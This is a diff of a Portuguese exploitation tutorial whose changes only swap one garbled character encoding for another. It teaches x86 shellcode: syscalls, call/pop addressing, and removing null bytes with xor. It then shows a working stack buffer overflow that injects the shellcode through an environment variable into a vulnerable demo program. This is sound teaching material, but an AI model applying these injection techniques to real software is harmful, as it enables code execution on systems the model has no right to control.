@@ -70,15 +70,15 @@
 
 
 
-Os bytes de shellcodes, s„o intruÁıes de uma m·quina de arquitetura especÌfica. Escrever um programa em ASM È diferente de escrevÍ-lo em C, mas com
-princÌpios similares. O SO gerencia coisas como input, output, process control, comunicaÁıes em geral de rede no kernel. Programas em  C compilados
+Os bytes de shellcodes, s√£o intru√ß√µes de uma m√°quina de arquitetura espec√≠fica. Escrever um programa em ASM √© diferente de escrev√™-lo em C, mas com
+princ√≠pios similares. O SO gerencia coisas como input, output, process control, comunica√ß√µes em geral de rede no kernel. Programas em  C compilados
 basicamente desenvolvem essas tarefas, fazendo chamadas(syscalls) ao kernel.
 
-Em C, as bibliotecas padr„o s„o usadas para  conveniÍncia e  portabilidade. Um app  em C que usa  "printf()" para a  saÌda de uma  string, pode ser
-compilado para muitos SOs diferentes, desde a lib saiba a chamada do sistema apropiado para v·rias arquiteturas.
+Em C, as bibliotecas padr√£o s√£o usadas para  conveni√™ncia e  portabilidade. Um app  em C que usa  "printf()" para a  sa√≠da de uma  string, pode ser
+compilado para muitos SOs diferentes, desde a lib saiba a chamada do sistema apropiado para v√°rias arquiteturas.
 
-Por definiÁ„o, a linguagem ASM j· È especÌfica para uma determinada arquitetura  de processador, por  isso, a portabilidade  È "impossÌvel". N„o h·
-libs padr„o; em vez disso, a chamada do sistema central tem que ser feita diretamente. Vamos aos exemplos.
+Por defini√ß√£o, a linguagem ASM j√° √© espec√≠fica para uma determinada arquitetura  de processador, por  isso, a portabilidade  √© "imposs√≠vel". N√£o h√°
+libs padr√£o; em vez disso, a chamada do sistema central tem que ser feita diretamente. Vamos aos exemplos.
 
 
 
@@ -113,7 +113,7 @@ return 0;
 }
 
 
-Quando o programa est· rodando, ele flui atravÈs da biblioteca I/O padr„o, fazendo uma  syscall para escrever a  linha "Hello, world!" *Compilando e
+Quando o programa est√° rodando, ele flui atrav√©s da biblioteca I/O padr√£o, fazendo uma  syscall para escrever a  linha "Hello, world!" *Compilando e
 analisando...
 
 
@@ -153,11 +153,11 @@ write(1, "Hello, world!\n", 14Hello, world!
 )         = 14
 "
 
-Como podemos ver, o programa compilado apenas imprime uma sequÍncia. As chamadas de sistema no inÌcio est„o estabelecendo o ambiente e memÛria para o programa, 
-mas, a parte importante È o syscall write() mostrado acima. Isso È o que promove a saÌda da sequÍncia. *Dando uma olhada no manual do Unix para o write()
+Como podemos ver, o programa compilado apenas imprime uma sequ√™ncia. As chamadas de sistema no in√≠cio est√£o estabelecendo o ambiente e mem√≥ria para o programa, 
+mas, a parte importante √© o syscall write() mostrado acima. Isso √© o que promove a sa√≠da da sequ√™ncia. *Dando uma olhada no manual do Unix para o write()
 
 
-WRITE(2)                   Linux Programmerís Manual                  WRITE(2)
+WRITE(2)                   Linux Programmer‚Äôs Manual                  WRITE(2)
 
 NAME
        write - write to a file descriptor
@@ -189,7 +189,7 @@ ERRORS
        EFAULT buf is outside your accessible address space.
 
        EFBIG  An attempt was made to write a file that exceeds the implementa-
-              tion-defined  maximum file size or the processí file size limit,
+              tion-defined  maximum file size or the process‚Äô file size limit,
               or to write at a position past the maximum allowed offset.
 
        EINTR  The call was interrupted by a signal before any data  was  writ-
@@ -232,12 +232,12 @@ SEE ALSO
 Linux 2.0.32                      2001-12-13                          WRITE(2)
 
 
-A saÌda do strace tambÈm mostra par‚metros para o syscall - buf e count - s„o um indicativo para nossa sequÍncia.
-O par‚metro fd de 1 È um padr„o especial de arquivo descritivo. Os arquivos descritivos s„o usados para quase
+A sa√≠da do strace tamb√©m mostra par√¢metros para o syscall - buf e count - s√£o um indicativo para nossa sequ√™ncia.
+O par√¢metro fd de 1 √© um padr√£o especial de arquivo descritivo. Os arquivos descritivos s√£o usados para quase
 tudo no Unix: input, output, arquivo de acesso, network sockets, e assim por diante.
 
-Os primeiros trÍs n˙meros dos arquivos descritivos (0, 1, 2) s„o automaticamente usados para a entrada padr„o, saÌda
-e erro. Esses valores s„o definidos:
+Os primeiros tr√™s n√∫meros dos arquivos descritivos (0, 1, 2) s√£o automaticamente usados para a entrada padr√£o, sa√≠da
+e erro. Esses valores s√£o definidos:
 
 
 - parte de /usr/include/unistd.h
@@ -247,8 +247,8 @@ e erro. Esses valores s„o definidos:
 #define	STDERR_FILENO	2	/* Standard error output.  */
 
 
-1 imprimir· os bytes;
-0 ir· "absorver" os bytes;
+1 imprimir√° os bytes;
+0 ir√° "absorver" os bytes;
 2 mostra erros.
 
 
@@ -287,7 +287,7 @@ e erro. Esses valores s„o definidos:
 
 
 
-Toda chamada È enumerada, assim elas podem ser referenciadas por n˙meros. Elas est„o listadas em "/usr/include/asm-i386/unistd.h":
+Toda chamada √© enumerada, assim elas podem ser referenciadas por n√∫meros. Elas est√£o listadas em "/usr/include/asm-i386/unistd.h":
 
 #ifndef _ASM_I386_UNISTD_H_
 #define _ASM_I386_UNISTD_H_
@@ -304,19 +304,19 @@ Toda chamada È enumerada, assim elas podem ser referenciadas por n˙meros. Elas e
 etc....
 
 
-Para reescrever helloworld.c em ASM, faremos uma chamadas de sistema para a funÁ„o write() e depois exit(), assim o processo sai
-integralmente. Isso pode ser feito na montagem x86 utilizando duas instruÁıes: mov e int.
+Para reescrever helloworld.c em ASM, faremos uma chamadas de sistema para a fun√ß√£o write() e depois exit(), assim o processo sai
+integralmente. Isso pode ser feito na montagem x86 utilizando duas instru√ß√µes: mov e int.
 
-As instruÁıes para o processador x86 tem 1, 2, 3 ou nenhum operador. Os operadores podem ser valores numÈricos, endereÁos de memÛria
-ou registradores de processadores, sendo EAX, EBX, ECX, EDX, ESI, EDI, EBP e ESB. *Explicando algumas intruÁıes
+As instru√ß√µes para o processador x86 tem 1, 2, 3 ou nenhum operador. Os operadores podem ser valores num√©ricos, endere√ßos de mem√≥ria
+ou registradores de processadores, sendo EAX, EBX, ECX, EDX, ESI, EDI, EBP e ESB. *Explicando algumas intru√ß√µes
 
-A instruÁ„o mov copia um valor entre seus dois operandos. Utilizando um ASM de syntax Intel, o primeiro operador È o destino e o segundo
+A instru√ß√£o mov copia um valor entre seus dois operandos. Utilizando um ASM de syntax Intel, o primeiro operador √© o destino e o segundo
 a fonte.
 
-A intruÁ„o int envia um sinal interrompido para o n˙cleo definido pelo seu operando. Com o kernel LNX, a interrupÁ„o 0x80 È usada para
-dizer ao n˙cleo para fazer uma chamada de sistema. Quando int 0x80 È executado, ir· acontecer uma chamada baseada nos quatro primeiros
-registradores. O registrador EAX È usado para especificar qual chamada de sistema fazer, enquanto os registradores EBC, ECX e EDX s„o
-usados para "segurar" par‚metros.
+A intru√ß√£o int envia um sinal interrompido para o n√∫cleo definido pelo seu operando. Com o kernel LNX, a interrup√ß√£o 0x80 √© usada para
+dizer ao n√∫cleo para fazer uma chamada de sistema. Quando int 0x80 √© executado, ir√° acontecer uma chamada baseada nos quatro primeiros
+registradores. O registrador EAX √© usado para especificar qual chamada de sistema fazer, enquanto os registradores EBC, ECX e EDX s√£o
+usados para "segurar" par√¢metros.
 
 
 - helloworld.asm
@@ -340,18 +340,18 @@ _start:
   int 0x80          ; do the syscall
 
 
-As instruÁıes desse programa s„o diretas. Para a syscall write(), o valor de 4 È colocado em EAX desde que o mesmo seja a chamada de n˙mero quatro.
-Ent„o o valor de 1 È colocado em EBX, desde que o primeiro par‚metro de write() sej· o arquivo descritivo para a saÌda padr„o. Em seguida, o endereÁo
-da sequÍncia È colocado no ECX, e o comprimento (14 bytes) È colocado em EDX.
+As instru√ß√µes desse programa s√£o diretas. Para a syscall write(), o valor de 4 √© colocado em EAX desde que o mesmo seja a chamada de n√∫mero quatro.
+Ent√£o o valor de 1 √© colocado em EBX, desde que o primeiro par√¢metro de write() sej√° o arquivo descritivo para a sa√≠da padr√£o. Em seguida, o endere√ßo
+da sequ√™ncia √© colocado no ECX, e o comprimento (14 bytes) √© colocado em EDX.
 
-Para sair totalmente, o mÈtodo exit() deve ser chamado com um par‚metro de 0. Assim, o valor de 1 È colocado em EAX, desde que o mÈtodo seja a chamada
-de sistema de n˙mero 1, e o valor de 0 È colocado em EBX. Dessa forma, tudo È interrompido e roda novamente.
+Para sair totalmente, o m√©todo exit() deve ser chamado com um par√¢metro de 0. Assim, o valor de 1 √© colocado em EAX, desde que o m√©todo seja a chamada
+de sistema de n√∫mero 1, e o valor de 0 √© colocado em EBX. Dessa forma, tudo √© interrompido e roda novamente.
 
-Para criar um bin·rio execut·vel, esse cÛdigo deve ser montado. Enquanto compila o cÛdigo C, o GCC cuida disso automaticamente. NÛs criaremos um bin·rio
-de formato execut·vel e de link (ELF), ent„o, a queue global_start mostra onde as intruÁıes ASM s„o iniciadas.
+Para criar um bin√°rio execut√°vel, esse c√≥digo deve ser montado. Enquanto compila o c√≥digo C, o GCC cuida disso automaticamente. N√≥s criaremos um bin√°rio
+de formato execut√°vel e de link (ELF), ent√£o, a queue global_start mostra onde as intru√ß√µes ASM s√£o iniciadas.
 
-O assembler NASM com o par‚metro -f elf montar· o helloworld.asm em um arquivo objeto pronto para ter um attach com um ELF. Por padr„o ele ser· chamado
-de helloworld.o. O programa que produzir· o bin·rio ser· o ld.
+O assembler NASM com o par√¢metro -f elf montar√° o helloworld.asm em um arquivo objeto pronto para ter um attach com um ELF. Por padr√£o ele ser√° chamado
+de helloworld.o. O programa que produzir√° o bin√°rio ser√° o ld.
 
 
 root@nbdu1nder-desktop:/home/nbdu1nder/src # nasm -f elf helloworld.asm
@@ -360,7 +360,7 @@ root@nbdu1nder-desktop:/home/nbdu1nder/src # ./a.out
 Hello, world!
 root@nbdu1nder-desktop:/home/nbdu1nder/src #
 
-Mas isso ainda n„o È um shellcode, veremos no tÛpico a seguir o porque...
+Mas isso ainda n√£o √© um shellcode, veremos no t√≥pico a seguir o porque...
 
 [------------------------------------------------------------------------]
 
@@ -389,29 +389,29 @@ Mas isso ainda n„o È um shellcode, veremos no tÛpico a seguir o porque...
              '---..___..---'
 
 
-Shellcode È um grupo de instruÁıes - que devem ser independentes - onde literalmente È injetado num programa em execuÁ„o. No shellcode, os bytes para a
-string "Hello, world!" devem ser misturados com os das intruÁıes ASM, desde que n„o haja segmentos de memÛria definÌveis ou "previsÌveis". 
+Shellcode √© um grupo de instru√ß√µes - que devem ser independentes - onde literalmente √© injetado num programa em execu√ß√£o. No shellcode, os bytes para a
+string "Hello, world!" devem ser misturados com os das intru√ß√µes ASM, desde que n√£o haja segmentos de mem√≥ria defin√≠veis ou "previs√≠veis". 
 
-Tudo ocorre bem atÈ o EIP tentar interpretar a sequÍncia como instruÁıes, mas, para acess·-la, precisamos de um pointer. Quando o shellcode È executado, o pointer
-poder· estar em qualquer posiÁ„o da memÛria.
+Tudo ocorre bem at√© o EIP tentar interpretar a sequ√™ncia como instru√ß√µes, mas, para acess√°-la, precisamos de um pointer. Quando o shellcode √© executado, o pointer
+poder√° estar em qualquer posi√ß√£o da mem√≥ria.
 
 
 
 $~ STACKS ~$
-InstruÁıes especiais para operaÁıes com pilhas:
+Instru√ß√µes especiais para opera√ß√µes com pilhas:
 
 push <source> -> Coloca o operando <source> na pilha
 pop <destination> -> Retira um valor da pilha e guarda no <destination>
-call <location> -> Chama uma funÁ„o, pulando a execuÁ„o para o endereÁo do operando <location>. O endereÁo È colocado na pilha, podendo ser retomado depois.
-ret -> Retorna um mÈtodo, disparando o endereÁo de retorno da pilha e pulando a execuÁ„o.
+call <location> -> Chama uma fun√ß√£o, pulando a execu√ß√£o para o endere√ßo do operando <location>. O endere√ßo √© colocado na pilha, podendo ser retomado depois.
+ret -> Retorna um m√©todo, disparando o endere√ßo de retorno da pilha e pulando a execu√ß√£o.
 
-A arquitetura da pilha explora possibilidades pelas instruÁıes call e ret. Quando a funÁ„o È chamada, o endereÁo de retorno da prÛxima instruÁ„o È colocado
-na pilha, comeÁando a estrutura de dados. Depois que a funÁ„o termina, a instruÁ„o ret retira o endereÁo de retorno da pilha e pula o EIP de volta. Pela
-transcriÁ„o do endereÁo de retorno guardado sobre a pilha antes de instruÁ„o ret, podemos tomar o controle da execuÁ„o de um aplicativo.
+A arquitetura da pilha explora possibilidades pelas instru√ß√µes call e ret. Quando a fun√ß√£o √© chamada, o endere√ßo de retorno da pr√≥xima instru√ß√£o √© colocado
+na pilha, come√ßando a estrutura de dados. Depois que a fun√ß√£o termina, a instru√ß√£o ret retira o endere√ßo de retorno da pilha e pula o EIP de volta. Pela
+transcri√ß√£o do endere√ßo de retorno guardado sobre a pilha antes de instru√ß√£o ret, podemos tomar o controle da execu√ß√£o de um aplicativo.
 
-Isso pode ser utilizado de forma indevida em um outro caminho para resolver o problema de abordar os dados na sequÍncia, sendo colocada diretamente apÛs a
-instruÁ„o da chamada, o endereÁo ser· pressionado para a pilha como retorno. Ao invÈs de chamar uma funÁ„o, podemos dar um pull em um registrador. Mostrarei
-essa tÈcnica a seguir:
+Isso pode ser utilizado de forma indevida em um outro caminho para resolver o problema de abordar os dados na sequ√™ncia, sendo colocada diretamente ap√≥s a
+instru√ß√£o da chamada, o endere√ßo ser√° pressionado para a pilha como retorno. Ao inv√©s de chamar uma fun√ß√£o, podemos dar um pull em um registrador. Mostrarei
+essa t√©cnica a seguir:
 
 - helloworld1.s
 BITS 32             ; tell nasm this is 32-bit code
@@ -432,10 +432,10 @@ mark_below:
   mov ebx, 0        ; status = 0   
   int 0x80          ; do syscall:  exit(0)
 
-A chamada da instruÁ„o pula a execuÁ„o sob a string. Isso tambÈm "esmaga" o endereÁo da prÛxima instruÁ„o para a pilhar; a prÛx instruÁ„o, no caso, È o inÌcio
-da string. O endereÁo de retorno pode imediatamente ser disparado a partir da pilha dentro do registrador apropriado. Sem usar nenhum segmento de memÛria, essas
-strings, injetadas em um processo existente, ser„o executadas de modo completamente independente. Isso significa que, quando elas s„o montadas, n„o podem ser ligadas
-a um execut·vel.
+A chamada da instru√ß√£o pula a execu√ß√£o sob a string. Isso tamb√©m "esmaga" o endere√ßo da pr√≥xima instru√ß√£o para a pilhar; a pr√≥x instru√ß√£o, no caso, √© o in√≠cio
+da string. O endere√ßo de retorno pode imediatamente ser disparado a partir da pilha dentro do registrador apropriado. Sem usar nenhum segmento de mem√≥ria, essas
+strings, injetadas em um processo existente, ser√£o executadas de modo completamente independente. Isso significa que, quando elas s√£o montadas, n√£o podem ser ligadas
+a um execut√°vel.
 
 root@nbdu1nder-desktop:/home/nbdu1nder/src # nasm helloworld1.s
 root@nbdu1nder-desktop:/home/nbdu1nder/src # ls -l helloworld1
@@ -466,8 +466,8 @@ root@nbdu1nder-desktop:/home/nbdu1nder/src # ndisasm -b32 helloworld1
 00000030  CD80              int 0x80
 root@nbdu1nder-desktop:/home/nbdu1nder/src # 
 
-O assembler nasm converte o cÛdigo ASM para um cÛdigo que seja interpretado pela m·quina, e o ndisasm converte isso em Assembly. Essas tools s„o utilizadas acima
-para mostrar a relaÁ„o entre os bytes do cÛdigo de m·quina e as intruÁıes em ASM. Vou utilizar um programa vulner·vel retirado do livro The Art of Exploitation para 
+O assembler nasm converte o c√≥digo ASM para um c√≥digo que seja interpretado pela m√°quina, e o ndisasm converte isso em Assembly. Essas tools s√£o utilizadas acima
+para mostrar a rela√ß√£o entre os bytes do c√≥digo de m√°quina e as intru√ß√µes em ASM. Vou utilizar um programa vulner√°vel retirado do livro The Art of Exploitation para 
 demonstrar algumas coisas:
 
 - notesearch.c
@@ -580,7 +580,7 @@ root@nbdu1nder-desktop:/home/nbdu1nder/src # ./getenvaddr SHELLCODE ./notesearch
 SHELLCODE will be at 0xbffff9cb
 root@nbdu1nder-desktop:/home/nbdu1nder/src # ./notesearch $(perl -e 'print "\xc6\xf9\xff\xbf"x40')
 -------[ end of note data ]-------
-Falha de segmentaÁ„o
+Falha de segmenta√ß√£o
 root@nbdu1nder-desktop:/home/nbdu1nder/src # 
 
 
@@ -602,16 +602,16 @@ root@nbdu1nder-desktop:/home/nbdu1nder/src #
                               `"`        ``---``        `"`
 
 
-Um caminho para depurar programas È um registro da posiÁ„o da memÛria. A partir de um terminal, o SO pode fazer a contagem para a memÛria
-descarregada quando o programa sofre crash, utilizando o comando ulimit -c unlimited. Isso significa que os arquivos de registro da posiÁ„o
-da memÛria s„o permitidos o quanto for necess·rio. *Analisando a situaÁ„o...
+Um caminho para depurar programas √© um registro da posi√ß√£o da mem√≥ria. A partir de um terminal, o SO pode fazer a contagem para a mem√≥ria
+descarregada quando o programa sofre crash, utilizando o comando ulimit -c unlimited. Isso significa que os arquivos de registro da posi√ß√£o
+da mem√≥ria s√£o permitidos o quanto for necess√°rio. *Analisando a situa√ß√£o...
 
 
 root@nbdu1nder-desktop:/home/nbdu1nder/src # ulimit -c unlimited
 root@nbdu1nder-desktop:/home/nbdu1nder/src # export SHELLCODE=$(cat helloworld1)root@nbdu1nder-desktop:/home/nbdu1nder/src # ./getenvaddr SHELLCODE ./notesearchSHELLCODE will be at 0xbffff9cb
 root@nbdu1nder-desktop:/home/nbdu1nder/src # ./notesearch $(perl -e 'print "\xc6\xf9\xff\xbf"x40')
 -------[ end of note data ]-------
-Falha de segmentaÁ„o (core dumped)
+Falha de segmenta√ß√£o (core dumped)
 root@nbdu1nder-desktop:/home/nbdu1nder/src # ls -l ./core
 -rw------- 1 root root 147456 2013-09-19 00:15 ./core
 root@nbdu1nder-desktop:/home/nbdu1nder/src # gdb -q -c ./core
@@ -642,12 +642,12 @@ root@nbdu1nder-desktop:/home/nbdu1nder/src # hexdump -C helloworld1
 00000030  cd 80                                             |..|
 00000032
 
-GDB quando carregado, o estilo de "desmontagem" do arquivo È trocado para Intel. Visto que estamos rodando como root, o arquivo .gdbinit n„o
-ser· usado. A memÛria onde o shellcode est· È examinada. As intruÁıes parecem incorretas, mas o que causou o bug foi a primeira. Pelo menos
-com a execuÁ„o redirecionada, ocorreu alguma coisa errada com os bytes do shellcode.
+GDB quando carregado, o estilo de "desmontagem" do arquivo √© trocado para Intel. Visto que estamos rodando como root, o arquivo .gdbinit n√£o
+ser√° usado. A mem√≥ria onde o shellcode est√° √© examinada. As intru√ß√µes parecem incorretas, mas o que causou o bug foi a primeira. Pelo menos
+com a execu√ß√£o redirecionada, ocorreu alguma coisa errada com os bytes do shellcode.
 
-Frequentemente, o shellcode ser· injetado em um processo como uma sequÍncia usando mÈtodos como strcpy(), tais quais, ser„o simplesmente determinados
-no primeiro null byte, produzinho um shellcode incompleto e in˙ti na memÛria. Para que ele funcione, n„o dever· conter bytes nulos.
+Frequentemente, o shellcode ser√° injetado em um processo como uma sequ√™ncia usando m√©todos como strcpy(), tais quais, ser√£o simplesmente determinados
+no primeiro null byte, produzinho um shellcode incompleto e in√∫ti na mem√≥ria. Para que ele funcione, n√£o dever√° conter bytes nulos.
 
 
 
@@ -696,11 +696,11 @@ root@nbdu1nder-desktop:/home/nbdu1nder/src # ndisasm -b32 helloworld1
 0000002B  BB00000000        mov ebx,0x0
 00000030  CD80              int 0x80
 
-Claramente a primeira instruÁ„o call() est· com byte nulo "E80F000000". Para contornar esse problema, podemos fazer uma chamada utilizando um valor negativo
-para mover para tr·s na execuÁ„o, um cÛdigo de m·quina para essa instruÁ„o que n„o ter· nenhum byte nulo. 
+Claramente a primeira instru√ß√£o call() est√° com byte nulo "E80F000000". Para contornar esse problema, podemos fazer uma chamada utilizando um valor negativo
+para mover para tr√°s na execu√ß√£o, um c√≥digo de m√°quina para essa instru√ß√£o que n√£o ter√° nenhum byte nulo. 
 
-A revis„o seguinte do shellcode helloworld usa uma implmentaÁ„o padr„o; pula para o fim do shellcode para uma chamada que por sua vez, pular· para tr·s pra
-uma instruÁ„o pop no inÌcio do shellcode *Deu pra entender? r$r$r$
+A revis√£o seguinte do shellcode helloworld usa uma implmenta√ß√£o padr√£o; pula para o fim do shellcode para uma chamada que por sua vez, pular√° para tr√°s pra
+uma instru√ß√£o pop no in√≠cio do shellcode *Deu pra entender? r$r$r$
 
 - helloworld2.s
 BITS 32             ; tell nasm this is 32-bit code
@@ -750,20 +750,20 @@ root@nbdu1nder-desktop:/home/nbdu1nder/src # ndisasm -b32 helloworld2
 root@nbdu1nder-desktop:/home/nbdu1nder/src # 
 
 
-ApÛs a montagem e desmontagem desse novo shellcode, mostra-se que a instruÁ„o "jmp short one" agora È livre de bytes nulos. Isso resolve
-o primeiro problema, mas ainda existem muitos outros, como pode-se ver acima... Isso pode ser eliminado com o endereÁamento do registrador.
-Note que a primeira instruÁ„o jmp È na verdade, um jump curto. Isso significa que a execuÁ„o pode pular apenas um m·x de 128bytes em cada
-direÁ„o. A instruÁ„o jmp normal (que n„o tem vers„o curta) permite pulos muito maiores. A diferenÁa entre os cÛdigos das variedades de saltos È:
+Ap√≥s a montagem e desmontagem desse novo shellcode, mostra-se que a instru√ß√£o "jmp short one" agora √© livre de bytes nulos. Isso resolve
+o primeiro problema, mas ainda existem muitos outros, como pode-se ver acima... Isso pode ser eliminado com o endere√ßamento do registrador.
+Note que a primeira instru√ß√£o jmp √© na verdade, um jump curto. Isso significa que a execu√ß√£o pode pular apenas um m√°x de 128bytes em cada
+dire√ß√£o. A instru√ß√£o jmp normal (que n√£o tem vers√£o curta) permite pulos muito maiores. A diferen√ßa entre os c√≥digos das variedades de saltos √©:
 
 EB 1E              jmp short 0x20
 vs.
 E9 1E 00 00 00     jmp 0x23
 
-Os registradores (EAX, EBX, ECX, EDX... etc) possuem 32bits de exentes„o. O E representa um extended porque originalmente esses eram de 16 bits
-chamados de AX, BX, CX, DX etc. Essas versıes antigas ainda podem ser utilizadas para acessar os primeiros 16 bits de cada registrador de 32 bits
-correspondente. AlÈm disso, os bytes individuais dos registradores podem ser acessados como de 8 bits, chamados de AL, AH, BL, BH etc... Onde L representa
-low byte e H, high byte. Naturalmente, as instruÁıes utilizando os registradores menores apenas necessitam especificar operadores atÈ o tamanha de bits do
-registro. As trÍs variaÁıes de uma intruÁ„o mov s„o:
+Os registradores (EAX, EBX, ECX, EDX... etc) possuem 32bits de exentes√£o. O E representa um extended porque originalmente esses eram de 16 bits
+chamados de AX, BX, CX, DX etc. Essas vers√µes antigas ainda podem ser utilizadas para acessar os primeiros 16 bits de cada registrador de 32 bits
+correspondente. Al√©m disso, os bytes individuais dos registradores podem ser acessados como de 8 bits, chamados de AL, AH, BL, BH etc... Onde L representa
+low byte e H, high byte. Naturalmente, as instru√ß√µes utilizando os registradores menores apenas necessitam especificar operadores at√© o tamanha de bits do
+registro. As tr√™s varia√ß√µes de uma intru√ß√£o mov s√£o:
 
 ---------------------------------
 Machine Code         Montagem
@@ -773,41 +773,41 @@ B8 04 00 00 00       mov EAX, 0x4
 B0 04                mov al, 0x4
 ---------------------------------
 
-O uso de registrador AL, BL, CL ou DL colocar· o byte menos significativo corretamente em um extended register correspondente sem criar qualquer null byte
-no cÛdigo de m·quina. Contudo, os trÍs primeiros bytes do registrador ainda poderiam conter alguma coisa. Especialmente para o shellcode, uma vez que ele
-assumir· um outro processo. Se queremos que os valores do registradores de 32 bits estejam corretos, precisamos zerar o registrador inteiro antes da instruÁ„o
-mov - mas isso, novamente, precisa ser feito sem usar null bytes. Aqui est„o algumas "mout instructions" *por assim dizer, simples. Essas duas primeiras elas
+O uso de registrador AL, BL, CL ou DL colocar√° o byte menos significativo corretamente em um extended register correspondente sem criar qualquer null byte
+no c√≥digo de m√°quina. Contudo, os tr√™s primeiros bytes do registrador ainda poderiam conter alguma coisa. Especialmente para o shellcode, uma vez que ele
+assumir√° um outro processo. Se queremos que os valores do registradores de 32 bits estejam corretos, precisamos zerar o registrador inteiro antes da instru√ß√£o
+mov - mas isso, novamente, precisa ser feito sem usar null bytes. Aqui est√£o algumas "mout instructions" *por assim dizer, simples. Essas duas primeiras elas
 incrementam e decrementam os operandos por 1.
 
 inc <target> -> Incrementa o operando alvo adicionando 1
 dec <target> -> Decrementa o operando alvo subtraindo 1
 
-As prÛx instruÁıes que vou explicar, tem dois operandos. Todos eles fazem uma aritmÈtica simples e operaÁıes lÛgicas mais r·pidas entre dois operandos, guardando
+As pr√≥x instru√ß√µes que vou explicar, tem dois operandos. Todos eles fazem uma aritm√©tica simples e opera√ß√µes l√≥gicas mais r√°pidas entre dois operandos, guardando
 o resultado no primeiro operando.
 
 add <dest>, <source> -> Adiciona o operando de origem ao operando de destino, guardando o resultado no primeiro.
 sub <dest>, <source> -> Subtrai o operando de origem do operando de destino, guardando o resultado no primeiro.
-and <dest>, <source> -> Executa uma operaÁ„o bin·ria lÛgica and, comparando cada bit de um operando com o bit correspondente do outro operando.
-xor <dest>, <source> -> Executa uma operaÁ„o bin·ria lÛgica or exclusiva, comparando cada bit de um operando com o bit correspondente do outro operando.
+and <dest>, <source> -> Executa uma opera√ß√£o bin√°ria l√≥gica and, comparando cada bit de um operando com o bit correspondente do outro operando.
+xor <dest>, <source> -> Executa uma opera√ß√£o bin√°ria l√≥gica or exclusiva, comparando cada bit de um operando com o bit correspondente do outro operando.
 
-VocÍ pode encontrar mais referÍncias aqui -> http://www.numaboa.com.br/informatica/tutos/assembly/1122-instrucoes-comuns
+Voc√™ pode encontrar mais refer√™ncias aqui -> http://www.numaboa.com.br/informatica/tutos/assembly/1122-instrucoes-comuns
 
-Um mÈtodo possÌvel de resoluÁ„o dos null bytes È mover um n˙mero arbitr·rio de 32 bits para dentro do registrador e ent„o subtrai o valor usando mov e sub:
+Um m√©todo poss√≠vel de resolu√ß√£o dos null bytes √© mover um n√∫mero arbitr√°rio de 32 bits para dentro do registrador e ent√£o subtrai o valor usando mov e sub:
 
 B8 44 33 22 11   mov eax,0x11223344
 2D 44 33 22 11   mov eax,0x11223344
 
-Essa tÈcnica tira 10 bytes de zero de um ˙nico registrador, fazendo o shellcode montado maior do que o necess·rio. Para otimizar isso: O valor de DWORD
-especificado em cada instruÁ„o abrange 80% do cÛdigo. Subtrair qualquer valor de si mesmo tambÈm produz zero e n„o exige dado est·tico. Isso pode ser feito
-com uma instruÁ„o ˙nica de 2 bytes:
+Essa t√©cnica tira 10 bytes de zero de um √∫nico registrador, fazendo o shellcode montado maior do que o necess√°rio. Para otimizar isso: O valor de DWORD
+especificado em cada instru√ß√£o abrange 80% do c√≥digo. Subtrair qualquer valor de si mesmo tamb√©m produz zero e n√£o exige dado est√°tico. Isso pode ser feito
+com uma instru√ß√£o √∫nica de 2 bytes:
 
 29 c0        sub eax,eax
 
-O uso de sub funcionar· bem enquanto estiver zerando registradores no comeÁo do shellcode. Ela modificar· os flags do processador, usados contudo, para ramificaÁıes;
-Por essa raz„o, h· uma instruÁ„o preferencial de dois bytes que È usada para zerar registradores na maioria dos shellcodes. Xor executa uma operaÁ„o or exclusiva
-sobre os bits em um registrador. Visto que 1 xor 1 resulta em um 0, e 0 xor resulta em um 0, qualquer valor de um xor dele mesmo resultar· em 0 *Sacou? Lulzzzz
+O uso de sub funcionar√° bem enquanto estiver zerando registradores no come√ßo do shellcode. Ela modificar√° os flags do processador, usados contudo, para ramifica√ß√µes;
+Por essa raz√£o, h√° uma instru√ß√£o preferencial de dois bytes que √© usada para zerar registradores na maioria dos shellcodes. Xor executa uma opera√ß√£o or exclusiva
+sobre os bits em um registrador. Visto que 1 xor 1 resulta em um 0, e 0 xor resulta em um 0, qualquer valor de um xor dele mesmo resultar√° em 0 *Sacou? Lulzzzz
 
-VocÍ pode usar subscriptions para zerar registradores - sendo usadas no inÌcio do shellcode -. Faremos um novo helloworld, evitando totalmente bytes nulos, utilizando
+Voc√™ pode usar subscriptions para zerar registradores - sendo usadas no in√≠cio do shellcode -. Faremos um novo helloworld, evitando totalmente bytes nulos, utilizando
 o xor:
 
 - helloworld3.s
@@ -862,7 +862,7 @@ root@nbdu1nder-desktop:/home/nbdu1nder/src # ndisasm -b32 helloworld3
 00000025  64210A            and [fs:edx],ecx
 00000028  0D                db 0x0D
 
-Bazinga! Agora vamos utiliz·-lo basicamente como um exploit no nosso programa vulner·vel:
+Bazinga! Agora vamos utiliz√°-lo basicamente como um exploit no nosso programa vulner√°vel:
 
 root@nbdu1nder-desktop:/home/nbdu1nder/src # export SHELLCODE=$(cat helloworld3)
 root@nbdu1nder-desktop:/home/nbdu1nder/src # ./getenvaddr SHELLCODE ./notesearch
@@ -875,7 +875,7 @@ root@nbdu1nder-desktop:/home/nbdu1nder/src #
 
 
 $~ FINAL CONSIDERATIONS ~$
-Espero que tenham compreendido, escrever sobre esse assunto È bastante complicado ent„o, se n„o gostou, problema È seu n0000bbz! r$r$r$
+Espero que tenham compreendido, escrever sobre esse assunto √© bastante complicado ent√£o, se n√£o gostou, problema √© seu n0000bbz! r$r$r$
 
 
 
